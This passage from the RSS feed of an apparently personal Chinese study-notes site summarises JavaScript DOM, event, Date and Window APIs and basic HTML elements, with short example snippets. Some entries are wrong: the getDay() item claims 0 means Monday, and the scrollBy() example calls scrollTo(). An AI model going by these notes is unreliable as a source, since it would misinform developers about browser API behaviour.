 创建 Document 对象，开始解析 Web 页面。 解析 HTML 元素和它们的文本内容后添加 Element 对象和 Text 节点到文档中。此时的document.readyState = &#39;loading&#39;。 如遇到 link 引入的外部 CSS，那么创建线程加载这个 CSS，并继续解析文档。 遇到 script 引入的外部 JS，并且没有设置异步 async、defer 等，浏览器则同步加载这个 JS 文件，并阻塞，等待 JS 加载完成并执行该脚本，然后继续解析文档。 遇到 script 引入的外部 JS，井且设置有异步 async、defer 等，浏览器创建异步线程加载，井继续解析文档。对于 async 属性的脚本，脚本加载完成后立即执行。(异步加载的 JS 文件，其中禁止使用 document.write()) 遇到 img 等有 src 属性的元素，先正常解析 DOM 结构，然后浏览器异步加载 src，并继续解析文档。 当文档（DOMTree）解析完成，此时的document.readyState = &#39;interactive&#39;。 文档解析完成后，所有设置有 defer 的脚本会按照顺序执行。（注意与async的不同,但同样禁止使用document.write()） document 对象触发 DOMContentLoaded 事件，这也标志着程序执行从同步脚本执行阶段，转化为事件驱动阶段。 当所有 async 的脚本加载完成并执行完毕后、img 等加载完成后，document.</description>
    </item>
    
    <item>
      <title>JavaScript Document</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/dom/document/document/</link>
      <pubDate>Sat, 07 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/dom/document/document/</guid>
      <description>Document Document 是文档的根，表示整个文档，它包含所有元素，包括 html 元素。</description>
    </item>
    
    <item>
      <title>JavaScript Document 属性</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/dom/document/document-%E5%B1%9E%E6%80%A7/</link>
      <pubDate>Sat, 07 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/dom/document/document-%E5%B1%9E%E6%80%A7/</guid>
      <description>Document 属性 head 和 body 表示文档中的 head 和 body 元素。
document.head document.body documentElement 表示文档中的 html 元素。
document.documentElement </description>
    </item>
    
    <item>
      <title>JavaScript Document 方法</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/dom/document/document-%E6%96%B9%E6%B3%95/</link>
      <pubDate>Sat, 07 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/dom/document/document-%E6%96%B9%E6%B3%95/</guid>
      <description>Document 方法 查找节点 使用 querySelectorAll 和 querySelector 方法选择的元素不是实时的，而使用 getElements 方法选择的元素是实时的。
比如，使用 querySelecto 选择 div 元素，并存放到 ele 变量中，如果后面我们在文档中删除或增加一个 div 元素，ele 中的 div 元素依旧不变。
getElementById() 选择文档中指定 id 的元素，id 是唯一的，所以是 getElement，不是 getElements
var ele = document.getElementById(&amp;#39;only&amp;#39;) getElementsByTagName() 选择文档中指定标签名的元素，返回结果是一个类数组
var ele = document.getElementsByTagName(&amp;#39;span&amp;#39;) getElementsByTagName(&amp;rsquo;*&#39;) 选择文档中的所有元素。
var ele = document.getElementsByTagName(&amp;#39;*&amp;#39;) getElementsByName() 选择文档中指定 name 的元素，ele 是一个类数组，需要注意，该元素只有部分元素才能生效
var ele = document.getElementsByName(&amp;#39;span&amp;#39;) getElementsByClassName() 选择文档中指定 class 的元素
var ele = document.getElementsByClassName(&amp;#39;build&amp;#39;) querySelector() 选择匹配指定选择器的第一个元素。不实时
var ele = document.querySelector(&amp;#39;div &amp;gt; span a .</description>
    </item>
    
    <item>
      <title>HTML 伪元素和伪类</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/html/%E4%BC%AA%E5%85%83%E7%B4%A0%E5%92%8C%E4%BC%AA%E7%B1%BB/</link>
      <pubDate>Fri, 06 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/html/%E4%BC%AA%E5%85%83%E7%B4%A0%E5%92%8C%E4%BC%AA%E7%B1%BB/</guid>
      <description>伪元素和伪类 伪类选择器和伪元素选择器都是 CSS 选择器的一种。
伪类选择器使用:开头。
伪元素选择器使用::开头
伪类 用于当已有元素处于的某个状态时，为其添加对应的样式，这个状态根据用户行为而动态变化。
比如说，当用户悬停在指定的元素时，我们可以通过:hover来描述这个元素的状态。虽然它和普通的 css 类相似，可以为已有的元素添加样式，但是它只有处于 DOM 树无法描述的状态下才能为元素添加样式，所以将其称为伪类。
伪元素 伪元素用于创建一些不在 DOM 树中的元素（虚拟元素），并为其添加其 CSS 样式。伪元素开头为双冒号::。
比如说，我们可以用::before或::after在一个元素的前面或后面增加一些文本，并为这些文本添加样式。虽然用户可以看到这些文本，但是这些文本实际上不在 DOM 树中，因为他们都是虚拟的元素。
 </description>
    </item>
    
    <item>
      <title>HTML DOCTYPE</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/html/doctype/</link>
      <pubDate>Thu, 05 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/html/doctype/</guid>
      <description>DOCTYPE 用来告知浏览器该使用了哪种渲染方式来渲染当前文档。
文档首行是&amp;lt;!DOCTYPE html&amp;gt;，则浏览器渲染模式为标准模式；首行不是或没有&amp;lt;!DOCTYPE html&amp;gt;则浏览器的渲染模式为怪异模式。
目前浏览器的渲染引擎使用三种模式：怪异模式、接近标准模式、以及标准模式。
历史问题 在很久以前的网络上，页面通常有两种版本：为网景的 Navigator 准备的版本，以及为微软的 Internet Explorer 准备的版本。
当 W3C 创立网络标准后，为了不破坏当时既有的网站，浏览器不能直接弃用这些标准。因此，浏览器采用了两种模式，用以把能符合新规范的网站和老旧网站区分开。
标准模式 在标准模式下，行为即由 HTML 与 CSS 的规范描述的行为。
在接近标准模式下，只有少数的怪异行为被实现。
怪异模式 在怪异模式下，文档会兼容之前的网页。也叫混杂模式。
compatMode 返回当前浏览器采用的渲染方式。
BackCompat 标准兼容模式关闭，当document.compatMode等于BackCompat时，浏览器客户区宽度为 document.body.clientWidth;
CSS1Compat 标准兼容模式开启,当document.compatMode等于CSS1Compat时浏览器客户区宽度为document.documentElement.clientWidth;</description>
    </item>
    
    <item>
      <title>HTML 表单元素</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/html/%E8%A1%A8%E5%8D%95%E5%85%83%E7%B4%A0/%E8%A1%A8%E5%8D%95%E5%85%83%E7%B4%A0/</link>
      <pubDate>Thu, 05 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/html/%E8%A1%A8%E5%8D%95%E5%85%83%E7%B4%A0/%E8%A1%A8%E5%8D%95%E5%85%83%E7%B4%A0/</guid>
      <description>表单元素 label 关联指定的表单元素。
for 为需要关联的元素 id，关联之后，当点击label 时，也可以聚焦到label所关联的元素。
&amp;lt;label for=&amp;#34;account&amp;#34;&amp;gt;账号：&amp;lt;/label&amp;gt; &amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;&amp;#34; id=&amp;#34;account&amp;#34;&amp;gt; select 下拉列表。
option 定义下拉列表中可选择的选项。
通过添加 selected 属性来定义默认选项。
&amp;lt;select name=&amp;#34;cars&amp;#34;&amp;gt; &amp;lt;option value=&amp;#34;volvo&amp;#34; selected&amp;gt;Volvo&amp;lt;/option&amp;gt; &amp;lt;option value=&amp;#34;saab&amp;#34;&amp;gt;Saab&amp;lt;/option&amp;gt; &amp;lt;option value=&amp;#34;fiat&amp;#34;&amp;gt;Fiat&amp;lt;/option&amp;gt; &amp;lt;option value=&amp;#34;audi&amp;#34;&amp;gt;Audi&amp;lt;/option&amp;gt; &amp;lt;/select&amp;gt; textarea 文本域（多行输入框）。
&amp;lt;textarea name=&amp;#34;message&amp;#34; rows=&amp;#34;10&amp;#34; cols=&amp;#34;30&amp;#34;&amp;gt; The cat was playing in the garden. &amp;lt;/textarea&amp;gt; button 按钮。
&amp;lt;button type=&amp;#34;button&amp;#34; onclick=&amp;#34;alert(&amp;#39;Hello World!&amp;#39;)&amp;#34;&amp;gt;Click Me!&amp;lt;/button&amp;gt; datalist datalist为 input 设置预定义的下拉列表。
input 获取焦点时，可以看到预定义的下拉列表。
input 的 list 属性必须为 datalist的 id。
&amp;lt;form&amp;gt;  &amp;lt;input list=&amp;#34;browsers&amp;#34;&amp;gt;  &amp;lt;datalist id=&amp;#34;browsers&amp;#34;&amp;gt;  &amp;lt;option value=&amp;#34;Internet Explorer&amp;#34;&amp;gt;  &amp;lt;option value=&amp;#34;Firefox&amp;#34;&amp;gt;  &amp;lt;option value=&amp;#34;Chrome&amp;#34;&amp;gt;  &amp;lt;option value=&amp;#34;Opera&amp;#34;&amp;gt;  &amp;lt;option value=&amp;#34;Safari&amp;#34;&amp;gt;  &amp;lt;/datalist&amp;gt; &amp;lt;/form&amp;gt; </description>
    </item>
    
    <item>
      <title>JavaScript Date</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E6%95%B0%E5%AD%97%E5%92%8C%E6%97%A5%E6%9C%9F/date/date/</link>
      <pubDate>Thu, 05 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E6%95%B0%E5%AD%97%E5%92%8C%E6%97%A5%E6%9C%9F/date/date/</guid>
      <description>Date 创建一个 Date 实例，该实例呈现时间中的某个时刻。
Date 对象基于格林威治 Unix Time Stamp，即自 1970年 1 月 1 日（UTC）起经过的毫秒数。
Date 对象有大量的设置、获取和操作日期的方法。 但它并不含有任何属性。
Date 对象中存放的都是被构造出来的那一刻的时间，而不是随着系统时间改变而改变。</description>
    </item>
    
    <item>
      <title>JavaScript Element</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/dom/element/element/</link>
      <pubDate>Thu, 05 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/dom/element/element/</guid>
      <description>Element 用来遍历元素节点。</description>
    </item>
    
    <item>
      <title>JavaScript Event</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/events/event/event-%E6%96%B9%E6%B3%95/</link>
      <pubDate>Thu, 05 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/events/event/event-%E6%96%B9%E6%B3%95/</guid>
      <description>Event stopPropagation() 用于取消事件的捕获和冒泡，W3C 推荐的方法。
cancelBubble() 功能与stopPropagation()相同， IE 独有，但在 Chrome 中也可以用。
var wrapper = document.getElementsByClassName(&amp;#39;wrapper&amp;#39;)[0];  document.addEventListener( 	&amp;#39;click&amp;#39;, 	function () { 	console.log(&amp;#39;document&amp;#39;); 	}, 	false );  wrapper.addEventListener( 	&amp;#39;click&amp;#39;, 	function (event) { 	console.log(&amp;#39;点击了子元素&amp;#39;);  	event.stopPropagation();  // IE 独有，但 Chrome 也可以使用 	event.cancelBubble = true; 	}, 	false ); </description>
    </item>
    
    <item>
      <title>JavaScript Event</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/events/event/event/</link>
      <pubDate>Thu, 05 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/events/event/event/</guid>
      <description>Event 表示在 DOM 中出现的事件。</description>
    </item>
    
    <item>
      <title>JavaScript Event 属性</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/events/event/event-%E5%B1%9E%E6%80%A7/</link>
      <pubDate>Thu, 05 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/events/event/event-%E5%B1%9E%E6%80%A7/</guid>
      <description>Event 属性 target 返回触发当前事件的事件源对象。
document.onclick = function (event) { 	console.log(event.target); }; </description>
    </item>
    
    <item>
      <title>JavaScript EventTarget</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/events/eventtarget/</link>
      <pubDate>Thu, 05 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/events/eventtarget/</guid>
      <description>EventTarget addEventListener() 监听一个对象，并给这个对象绑定指定的事件处理函数。
第一个参数是事件类型，第二个参数是事件的回调回函数。
this 的指向是 DOM 元素本身，第三个参数是一个布尔值，用于定义该对象应该使用哪一种事件处理模型（冒泡、捕获）进行触发。
优点 可以给同一个对象同一类型事件绑定多个事件处理函数，并且会按绑定事件的先后顺序去执行。
// 旧事件 div.addEventListener( 	&amp;#39;click&amp;#39;, 	function () { 	console.log(&amp;#39;第一个事件&amp;#39;); 	}, 	false ); // 新事件，不会fu div.addEventListener( 	&amp;#39;click&amp;#39;, 	function () { 	console.log(&amp;#39;第二个事件&amp;#39;); 	}, 	false ); attachEvent() IE 独有事件，它与 addEventListener() 差不多。
this 指向 window。
for 绑定 addEventListener() 事件 var li = document.getElementsByTagName(&amp;#39;li&amp;#39;);  var len = li.length; for (var i = 0; i &amp;lt; len; i++) {  // 用立即执行函数解决闭包内存泄漏的问题 	(function (i) { 	li[i].</description>
    </item>
    
    <item>
      <title>JavaScript get 方法</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E6%95%B0%E5%AD%97%E5%92%8C%E6%97%A5%E6%9C%9F/date/get-%E6%96%B9%E6%B3%95/</link>
      <pubDate>Thu, 05 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E6%95%B0%E5%AD%97%E5%92%8C%E6%97%A5%E6%9C%9F/date/get-%E6%96%B9%E6%B3%95/</guid>
      <description>get 方法 getDate() 返回一个月中的某天 1 — 31
getDay() 返回一周中的某天 0 — 6。
注意，0 表示周一，6 表示周日。
getMonth() 返回一年终的某月0 — 11。
注意，0 表示一月，11 表示 12 月
getFullYear() 获取四位数的年份 XXXX。
以前是用的 getYear() 方法，因为以前表示日期用的六位制 YY.MM.DD，直到 1999 年 12 月 31 日之后，变成了 2000 年，这个时候的日期用六位制已经无法表示了，因此，现在改用八位制 YYYY.MM.DD。
getHours() 获取小时 0 — 23
getMinutes() 获取分 0 — 59
getSeconds() 获取秒 0 — 59
getMilliseconds() 获取毫秒 0 — 999
getTime() 获取毫秒（从格林威治时间 1970 年 1 月 1 日至今的毫秒数），也叫获取时间戳。
时间戳 用于验证执行某个程序所花费的毫秒数。</description>
    </item>
    
    <item>
      <title>JavaScript GlobalEventHandlers</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/events/globaleventhandlers/</link>
      <pubDate>Thu, 05 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/events/globaleventhandlers/</guid>
      <description>GlobalEventHandlers 全局事件句柄，在 JavaScrip 中，为了将属性和事件区分开，所有事件的命名都是小写的，而不是像属性那样用小驼峰式命名。
onclick 当指定元素被点击时，所触发的事件。它的兼容性非常好。
基本等于将事件写到 HTML 元素的onclick内联属性上。
this 的指向是 DOM 元素本身。
只能监听鼠标左键，无法监听右键和滚轮。
onmousedown + onmouseup = onclick
缺点 一个元素只能绑定一个事件，如果给这个元素定义新的事件，那么新的事件会覆盖旧的事件。
var div = document.getElementsByTagName(&amp;#39;div&amp;#39;)[0];  // 旧事件 div.onclick = function () { 	console.log(&amp;#39;旧事件&amp;#39;); }; // 新事件，会覆盖旧事件 div.onclick = function () { 	console.log(&amp;#39;新s&amp;#39;); }; 点击事件只触发一次 div.onclick = function () { 	console.log(4555);  // 使 onclick 事件只能被触发一次 	div.onclick = null; }; oncontextmenu 鼠标右键单击指定对象时，所触发的事件。
onmousemove 鼠标移动到指定对象上时，所触发的事件。
onmousedown 鼠标按下指定对象时，所触发的事件。</description>
    </item>
    
    <item>
      <title>JavaScript HTMLElement 属性</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/dom/element/htmlelement/htmlelement-%E5%B1%9E%E6%80%A7/</link>
      <pubDate>Thu, 05 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/dom/element/htmlelement/htmlelement-%E5%B1%9E%E6%80%A7/</guid>
      <description>HTMLElement 属性 innerText/textContent 设置或获取指定元素所包含的文本信息，只返文本信息，不返回所包含的元素。
另外，设置元素内容的时候，如果元素内容中有子元素，则这些子元素也会被覆盖。
innerText 很容易 与textContent 混淆, 但这两个属性间实际上有很重要的区别. 大体来说, innerText可操作已被渲染的内容， 而 textContent 则不会。
var body = document.getElementsByTagName(&amp;#39;body&amp;#39;)[0]; var div = document.getElementsByTagName(&amp;#39;div&amp;#39;)[0]; // 设置内容 div.innerText = &amp;#39;123&amp;#39;; /textContent  div.textContent = &amp;#39;456&amp;#39;; offsetHeight 它返回该元素的像素高度，高度包含该元素的垂直内边距和边框，且是一个整数。
offsetWidth 它返回该元素的像素宽度，宽度包含该元素的水平内边距和边框，且是一个整数。
offsetLeft 返回当前元素左边界相对于最近的定位父元素的左边界的像素值。该值包含 border
如果当前元素的父元素中没有定位元素，则返回相对文档左边界的像素值。
offsetTop 它返回当前元素顶边界相对于最近的定位父元素的顶边界的像素值。该值包含 border
如果当前元素的父元素中没有定位元素，则返回相对文档左边界的像素值。
offsetParent 返回距离当前元素最近的定位父元素。
如果当前元素的父元素中没有定位元素，则返回 body。
style 设置或返回 ele 的内联样式表中的 attr，并不会返回内嵌样式表和外链样式表中的 CSS 属性。
设置的值必须为字符串格式。
如果是设置 float 这样的保留字属性，则尽量使用 cssFloat ，虽然也可以使用 float 设置，但是 W3C 并不建议使用 float，因为 float 是一个保留字，未来可能会成为关键字，避免未来的命名冲突。
复合属性尽量分开设置，比如boder，尽量分别设置borderWidth、borderStyle和borderColor。</description>
    </item>
    
    <item>
      <title>JavaScript set 方法</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E6%95%B0%E5%AD%97%E5%92%8C%E6%97%A5%E6%9C%9F/date/set-%E6%96%B9%E6%B3%95/</link>
      <pubDate>Thu, 05 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E6%95%B0%E5%AD%97%E5%92%8C%E6%97%A5%E6%9C%9F/date/set-%E6%96%B9%E6%B3%95/</guid>
      <description>set 方法 setDate() 以数值 1-31 设置日
var date = new Date(); // 设置日期中的第 18 天 var d = date.setDate(18); console.log(d); // 输出被更改后的时间戳，因为日变了，所以日对应的周也会跟着变。 console.log(date); 定时执行某个代码
用 set 方法设置一个未来的时间点，然后判断当 getTime() 的毫秒数与 set 的毫秒数相差小于 1000 的时候，相当于此刻的时间点已经和设置的时间点重合，可以执行一些需要在这个时间点所执行的操作。
用它可以实现倒计时抢漏、闹钟等功能。
setTime() 设置从 1970 年 1 月 1 日至今的毫秒数。
var date = new Date(); // 将 date 设置为从格林威治时间至今的毫秒数（毫秒数会转换为日期） date.setTime(12343546557501); // 返回设置的日期 console.log(date); 闹钟 var date = new Date(); // 设置未来的某个时间点的分和秒，当格林威治时间到达我们设置的时间戳，会执行某个操作 date.setMinutes(10); date.setSeconds(5);  // 定时器，每隔 1000 毫秒会执行一次回调函数 setInterval(function () { 	// 判断格林威治时间是否和设置的时间点相差小于 1000 毫秒（小于 1000 毫秒则表示格林威治时间已经到大我们设置的时间戳） 	if (new Date().</description>
    </item>
    
    <item>
      <title>JavaScript String 方法</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/string/string-%E6%96%B9%E6%B3%95/</link>
      <pubDate>Thu, 05 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/string/string-%E6%96%B9%E6%B3%95/</guid>
      <description>String 方法 fromCharCode() 将 UTF-16 组成的值转换为一个字符串。
match() 检索并返回字符串匹配正则表达式的结果。
参数通常是一个正则表达式，
 var reg = /ab/g;  var str = &amp;#39;abababababab&amp;#39;;  var result = str.match(reg); console.log(result); slice() 从字符串的第 n 位字符开始截取，一直截取到字符串最末。并返回一个新的字符串，且不会改动原字符串。
search() 返回子字符串在字符串中的起始位置（索引值）这个字符串也可以使正则表达式。
匹配失败返回 -1。
var str = &amp;#39;eedsddvv&amp;#39;;  var reg = /(\w)\1(\w)\2/g;  var result = str.search(reg);  console.log(result); split() 使用指定的分隔符字符串将一个字符串对象分割成子字符串数组，以一个指定的分割字串来决定每个拆分的位置。
除了会返回匹配结果，还会返回()中第一次匹配的子表达式的值，并且这些值是类数组的数据位，它们存在于类数组的索引位中。
var str = &amp;#39;dfjajfdsssajfiovvdsafjttidjf&amp;#39;;  var reg = /(\w)\1/g;  var result = str.split(reg);  console.log(result); 用数之来分割字符串 var str = &amp;#39;dfjajfdss0sajfiovvds0afjttidjf&amp;#39;;  var reg = /\d/g;  var result = str.</description>
    </item>
    
    <item>
      <title>JavaScript Window 属性</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/window/window-%E5%B1%9E%E6%80%A7/</link>
      <pubDate>Thu, 05 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/window/window-%E5%B1%9E%E6%80%A7/</guid>
      <description>Window 属性 innerWidth 和 innerHeight 返回视口的宽度和高度。
视口就是浏览器中能看到网页的部分。
// 视口宽度 var WViewport = window.innerWidth; // 视口高度 var HViewport = window.innerHeight; console.log(&amp;#39;视口宽度：&amp;#39; + WViewport); console.log(&amp;#39;视口高度：&amp;#39; + HViewport); pageYOffset 和 pageXOffset 返回滚动条当前的纵向滚动距离和横向滚动距离。
// 纵向滚动条的滚动距离 var Ydistance = window.pageYOffset; // 横向滚动条的滚动距离 var Xdistance = window.pageXOffset; console.log(Ydistance); console.log(Xdistance); IE 8 及 IE 8 以下的浏览器 document.body.scrollLeft/Top 和 document.documentElement.scorllLeft/Top这个两个属性的兼容性机器混乱，Top 代表纵向，Left 代表横向
在 IE 8及 IE 8 以下的浏览器中，这两个属性中只要其中一个有值，则另一个属性的值一定为 0。因此， 如果我们要考虑兼容性的问题，都会将这两个属性相加，以兼容 IE 8及其 IE 8 以下的浏览器。
DOMContentLoaded 文档解析完成后执行的事件。
它和window.onload的区别是，window.onload是在文档加载完成后所触发的事件，而DOMContentLoaded，无需等文档全部加载完成，只需要等文档（DOMTree）解析完成后，DOMContentLoaded就会被触发。</description>
    </item>
    
    <item>
      <title>JavaScript Window 方法</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/window/window-%E6%96%B9%E6%B3%95/</link>
      <pubDate>Thu, 05 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/window/window-%E6%96%B9%E6%B3%95/</guid>
      <description>Window 方法 scroll() 和 scrollTo() 使文档的滚动条滚动至文档中的特定位置。
//让水平的滚动条滚动到 100 像素的位置，再让垂直滚动条滚动到 200 像素的位置 scrollTo(100,200) scrollBy() 使文档的滚动条按指定的偏移量滚动。
//　让垂直滚动条滚动 10px， scrollTo(0,10) // 重复执行的话，滚动条会再滚动 10px scrollTo(0,10) getComputedStyle() 返回指定元素经过计算后的 CSS 样式,，且返回的值都是绝对值，它是一个只读属性。
返回的样式是元素在浏览器中最终渲染效果的样式。
第一个参数是元素，第二个参数是伪元素。
getComputedStyle() 的第二个参数可以获取第一个参数（元素）的伪元素（::before、::after等）的 CSS 样式。
第二个参数不是必须的，当不查询元素的伪元素的时候可以忽略或者传入 null。
currentStyle 只读属性，返回的 CSS 属性的值没有经过计算。IE 独有属性。
获取指定元素的指定 CSS 属性 var div = document.getElementsByTagName(&amp;#39;div&amp;#39;)[0];  function GetStyle(elem, name) { 	if (window.getComputedStyle) { 	return window.getComputedStyle(elem, null)[name]; 	} else { 	return elem.currentStyle[name]; 	} } setInterval() 用于每隔一段时间调用一个函数或一个代码片段。</description>
    </item>
    
    <item>
      <title>JavaScript 事件句柄</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/events/%E4%BA%8B%E4%BB%B6%E5%8F%A5%E6%9F%84/</link>
      <pubDate>Thu, 05 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/events/%E4%BA%8B%E4%BB%B6%E5%8F%A5%E6%9F%84/</guid>
      <description>事件句柄 事件发生时进行的操作。
事件句柄就是一个将元素的特定事件与某个函数关联起来，比如onclick、onmouseover 等都是事件句柄，它们会指向一个给定的函数，如果事件发生，那么就会执行此函数。
document.oncontextmenu = function () { 	console.log(&amp;#39;鼠标右击事件句柄&amp;#39;); }; document.onclick = function () { 	console.log(&amp;#39;点击事件句柄&amp;#39;); }; </description>
    </item>
    
    <item>
      <title>JavaScript 事件处理模型</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/events/%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%90%86%E6%A8%A1%E5%9E%8B/</link>
      <pubDate>Thu, 05 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/events/%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%90%86%E6%A8%A1%E5%9E%8B/</guid>
      <description>事件处理模型 一个对象的一个事件类型，只能触发一种事件处理模型，也就是要么触发事件冒泡，要么触发事件捕获。
另外，并不是所有事件都存冒泡，比如 focus、blur、change、submit、reset、select 等事件。
事件冒泡 结构上（非视觉上）为嵌套关系的元素，会存在事件冒泡的情况。即同一类型的事件，触发事件源，事件会以由内（事件源）至外的顺序被触发。
HTML &amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt;   &amp;lt;head&amp;gt;  &amp;lt;meta charset=&amp;#34;UTF-8&amp;#34;&amp;gt;  &amp;lt;meta http-equiv=&amp;#34;X-UA-Compatible&amp;#34; content=&amp;#34;IE=edge&amp;#34;&amp;gt;  &amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.0&amp;#34;&amp;gt;  &amp;lt;title&amp;gt;Document&amp;lt;/title&amp;gt;  &amp;lt;style&amp;gt;  * {  margin: 0;  padding: 0;  }   .wrapper {  width: 300px;  height: 300px;  background-color: rgb(183, 43, 43);  }   .content {  width: 200px;  height: 200px;  background-color: rgb(12, 175, 200);  }   .</description>
    </item>
    
    <item>
      <title>JavaScript 事件对象</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/events/%E4%BA%8B%E4%BB%B6%E5%AF%B9%E8%B1%A1/</link>
      <pubDate>Thu, 05 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/events/%E4%BA%8B%E4%BB%B6%E5%AF%B9%E8%B1%A1/</guid>
      <description>事件对象 在 DOM 中发生事件时，所有相关信息都会被收集并存储在一个名为**event **的对象中。这个对象包含了一些基本信息，比如导致事件的元素、发生的事件类型、可能与特定事件相关的任何其他数据等。
每个事件处理函数都有一个形参 event，这个 **event **就可以在函数中被当做 event 对象来使用。
// event 是一个参数，系统会自动将事件对象传给他。 document.onclick = function (event) { 	console.log(event); }; srcElement 表示触发当前事件的事件源对象。
可以用event.target来获取事件的 srcElement。
Button 表示触发当前事件是鼠标的左键还是右键，又或者是滚轮。
0 表示鼠标左键，1 表示鼠标滚轮，2 表示鼠标右键。
div.onmousedown = function (event) { 	if (event.button == 0) { 	console.log(&amp;#39;Left Click&amp;#39;); 	} else if (event.button == 1) { 	console.log(&amp;#39;Roller&amp;#39;); 	} else if (event.button == 2) { 	console.log(&amp;#39;Right Click&amp;#39;); 	} }; charCode 键盘事件的事件对象上的属性，返回按下的键的ASCII 码 。</description>
    </item>
    
    <item>
      <title>JavaScript 区分点击事件与长按事件</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E5%AE%9E%E4%BE%8B/%E5%8C%BA%E5%88%86%E7%82%B9%E5%87%BB%E4%BA%8B%E4%BB%B6%E4%B8%8E%E9%95%BF%E6%8C%89%E4%BA%8B%E4%BB%B6/</link>
      <pubDate>Thu, 05 May 2022 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E5%AE%9E%E4%BE%8B/%E5%8C%BA%E5%88%86%E7%82%B9%E5%87%BB%E4%BA%8B%E4%BB%B6%E4%B8%8E%E9%95%BF%E6%8C%89%E4%BA%8B%E4%BB%B6/</guid>
      <description>区分点击事件与长按事件 HTML &amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt;   &amp;lt;head&amp;gt;  &amp;lt;meta charset=&amp;#34;UTF-8&amp;#34;&amp;gt;  &amp;lt;meta http-equiv=&amp;#34;X-UA-Compatible&amp;#34; content=&amp;#34;IE=edge&amp;#34;&amp;gt;  &amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.0&amp;#34;&amp;gt;  &amp;lt;title&amp;gt;区分点击事件与长按事件.m&amp;lt;/title&amp;gt;  &amp;lt;style&amp;gt;  div {  width: 100px;  height: 100px;  background-color: rgb(15, 190, 131);  }  &amp;lt;/style&amp;gt;  &amp;lt;/head&amp;gt;   &amp;lt;body&amp;gt;  &amp;lt;div style=&amp;#34;position:absolute;left:0;top:0;&amp;#34;&amp;gt;该拖曳只对内联样式有效&amp;lt;/div&amp;gt;  &amp;lt;/body&amp;gt;  &amp;lt;script src=&amp;#34;./js/main.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;  &amp;lt;/html&amp;gt; JavaScrip var div = document.getElementsByTagName(&amp;#39;div&amp;#39;)[0];  var firstTime = new Date(); var lastTime = new Date(); var key = false; // 元素按下时的时间 document.</description>
    </item>
    
    <item>
      <title>JavaScript 定时器</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/window/%E5%AE%9A%E6%97%B6%E5%99%A8/</link>
